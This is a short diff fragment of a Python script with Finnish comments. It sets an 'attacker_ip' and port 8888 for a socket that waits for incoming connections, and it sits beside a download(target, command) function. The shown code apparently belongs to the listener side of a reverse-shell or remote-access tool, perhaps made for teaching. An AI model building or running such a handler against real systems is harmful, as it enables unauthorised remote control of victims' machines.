@@ -41,7 +41,7 @@ def download(target, command):
 #pääfunktio
 def main():
     #vaihtakaa oma ip
-    attacker_ip = ''
+    attacker_ip = '192.168.83.1'
     port        = 8888
     
     #luodaan socket (ipv4 & tcp) ja jäädään odottamaan yhteyttä
